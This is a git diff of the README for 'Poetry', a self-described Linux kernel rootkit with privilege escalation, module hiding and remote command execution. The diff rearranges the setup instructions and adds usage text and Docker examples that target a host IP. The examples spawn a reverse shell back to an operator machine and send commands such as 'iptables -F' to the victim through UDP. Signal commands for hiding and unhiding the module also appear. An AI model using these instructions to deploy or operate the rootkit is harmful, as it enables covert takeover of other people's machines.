@@ -2,34 +2,6 @@
 # Poetry
 This is a Linux kernel module rootkit made for >=5.X. It features privilege escalation, module hiding, and RCE/reverse shell capabilities. 
 
-## Server Setup
-### Building
-#### If not on Linux:
-Docker must be installed in order to compile the server binary. 
-```sh
-cd srv/
-make # compile the go binary
-ls out/ # compiled binary will be in the out/ directory
-```
-#### If on Linux:
-You can utilize the method above if you have Docker installed, or you can use the method below if you have Golang installed. 
-```sh
-cd srv/
-
-# compile the server binary
-go build
-```
-
-The compiled binary will be called: `poetry`
-
-### Usage
-Copy the compiled binary to the host system. Run the following commands to interact with the target:
-```sh
-export IFACE=<ethernet_interface> # set interface env var
-sudo -E ./poetry -t <target_ip> -s # -s attempts to spawn a reverse tcp shell
-sudo -E ./poetry -t <target_ip> -c "<command>" # -c sends a single command through udp. no output
-```
-
 ## Kernel Module
 ### Tested On:
 - 5.4.0
@@ -65,5 +37,59 @@ kill -36 0 # hide poet module
 kill -37 0 # unhide poet module
 ```
 
-## References
-TODO add refs
+## Server Setup + Usage
+To use the RCE section of the rootkit:
+```
+Usage of ./poetry:
+  -c string
+        Choice: Single command to run through UDP. No output.
+  -r string
+        Optional: Where to send the shell. Defaults to interface IP if not specified. 
+  -s    Choice: Spawn and connect to reverse shell
+  -t string
+        Required: IP address to target
+```
+
+### Docker
+The server can be compiled and run through Docker. 
+
+```sh
+cd srv/
+docker build -t poetry .
+docker run poetry # run without args to see usage
+
+# you must specify the -r option here when using the reverse shell capability. This will be the IP of the machine running the docker container. 
+
+# EXAMPLE 
+docker run -itp 7337:7337 poetry -t 192.168.10.10 -r 192.168.10.9 -s
+
+# EXAMPLE
+docker run poetry -t 192.168.10.10 -c "iptables -F"
+```
+### Building Binaries
+Secondary option.
+#### If not on Linux:
+Docker must be installed in order to statically compile the server binary. 
+```sh
+cd srv/
+make # compile the go binary
+ls out/ # compiled binary will be in the out/ directory
+```
+#### If on Linux:
+```sh
+cd srv/
+
+# compile the server binary
+go build
+```
+
+The compiled binary will be called: `poetry`
+
+#### Binary Usage
+Copy the compiled binary to the host system. Run the following commands to interact with the target:
+```sh
+export IFACE=<ethernet_interface> # set interface env var
+sudo -E ./poetry -t <target_ip> -s # -s attempts to spawn a reverse tcp shell
+sudo -E ./poetry -t <target_ip> -c "<command>" # -c sends a single command through udp. no output
+```
+
